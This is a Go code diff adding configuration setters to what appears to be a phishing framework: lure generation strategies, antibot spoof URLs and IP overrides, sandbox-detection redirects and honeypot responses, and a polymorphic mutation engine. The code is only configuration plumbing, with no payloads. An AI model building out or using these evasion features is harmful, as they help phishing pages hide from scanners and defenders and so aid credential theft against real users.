+func (c *Config) SetSandboxDetectionThreshold(threshold float64) {
+	c.sandboxDetectionConfig.DetectionThreshold = threshold
+	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
+	log.Info("sandbox detection threshold set to: %.2f", threshold)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSandboxDetectionAction(action string) {
+	c.sandboxDetectionConfig.ActionOnDetection = action
+	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
+	log.Info("sandbox detection action set to: %s", action)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSandboxDetectionHoneypot(response string) {
+	c.sandboxDetectionConfig.HoneypotResponse = response
+	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
+	log.Info("sandbox honeypot response configured")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSandboxDetectionRedirect(url string) {
+	c.sandboxDetectionConfig.RedirectURL = url
+	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
+	log.Info("sandbox redirect URL set to: %s", url)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetPolymorphicConfig() *infra.PolymorphicConfig {
+	return c.polymorphicConfig
+}
+
+func (c *Config) SetPolymorphicEnabled(enabled bool) {
+	c.polymorphicConfig.Enabled = enabled
+	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
+	log.Info("Polymorphic engine enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetPolymorphicLevel(level string) {
+	c.polymorphicConfig.MutationLevel = level
+	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
+	log.Info("Polymorphic mutation level set to: %s", level)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetPolymorphicCacheEnabled(enabled bool) {
+	c.polymorphicConfig.CacheEnabled = enabled
+	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
+	log.Info("Polymorphic cache enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetPolymorphicSeedRotation(minutes int) {
+	c.polymorphicConfig.SeedRotation = minutes
+	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
+	log.Info("Polymorphic seed rotation set to: %d minutes", minutes)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetPolymorphicTemplateMode(enabled bool) {
+	c.polymorphicConfig.TemplateMode = enabled
+	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
+	log.Info("Polymorphic template mode enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetPolymorphicMutation(mutation string, enabled bool) {
+	if c.polymorphicConfig.EnabledMutations == nil {
+		c.polymorphicConfig.EnabledMutations = make(map[string]bool)
+	}
+	c.polymorphicConfig.EnabledMutations[mutation] = enabled
+	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
+	log.Info("Polymorphic mutation '%s' enabled: %v", mutation, enabled)
+	c.cfg.WriteConfig()
+}
+
+// Lure Generation Configuration
+func (c *Config) GetLureGenerationStrategy() string {
+	if c.lureGenerationConfig == nil {
+		return "realistic"
+	}
+	return c.lureGenerationConfig.Strategy
+}
+
+func (c *Config) SetLureGenerationStrategy(strategy string) {
+	validStrategies := []string{"short", "medium", "long", "realistic", "hex", "base64", "mixed"}
+	isValid := false
+	for _, s := range validStrategies {
+		if s == strategy {
+			isValid = true
+			break
+		}
+	}
+
+	if !isValid {
+		log.Warning("Invalid lure generation strategy: %s. Using 'realistic' instead.", strategy)
+		strategy = "realistic"
+	}
+
+	c.lureGenerationConfig.Strategy = strategy
+	c.cfg.Set(CFG_LURE_GENERATION, c.lureGenerationConfig)
+	log.Info("Lure generation strategy set to: %s", strategy)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotEnabled(enabled bool) {
+	c.antibotConfig.Enabled = enabled
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot protection enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotAction(action string) {
+	c.antibotConfig.Action = action
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot action set to: %s", action)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotSpoofUrl(url string) {
+	c.antibotConfig.SpoofUrl = url
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot spoof URL set to: %s", url)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetAntibotThreshold(threshold float64) {
+	c.antibotConfig.MLThreshold = threshold
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Antibot ML threshold set to: %.2f", threshold)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) AddAntibotOverrideIP(ip string) error {
+	for _, i := range c.antibotConfig.OverrideIPs {
+		if i == ip {
+			return fmt.Errorf("ip %s already exists in override list", ip)
+		}
+	}
+	c.antibotConfig.OverrideIPs = append(c.antibotConfig.OverrideIPs, ip)
+	c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+	log.Info("Added IP %s to antibot override list", ip)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+func (c *Config) RemoveAntibotOverrideIP(ip string) error {
+	for i, v := range c.antibotConfig.OverrideIPs {
+		if v == ip {
+			c.antibotConfig.OverrideIPs = append(c.antibotConfig.OverrideIPs[:i], c.antibotConfig.OverrideIPs[i+1:]...)
+			c.cfg.Set(CFG_ANTIBOT, c.antibotConfig)
+			log.Info("Removed IP %s from antibot override list", ip)
+			c.cfg.WriteConfig()
+			return nil
+		}
+	}
+	return fmt.Errorf("ip %s not found in override list", ip)
 }
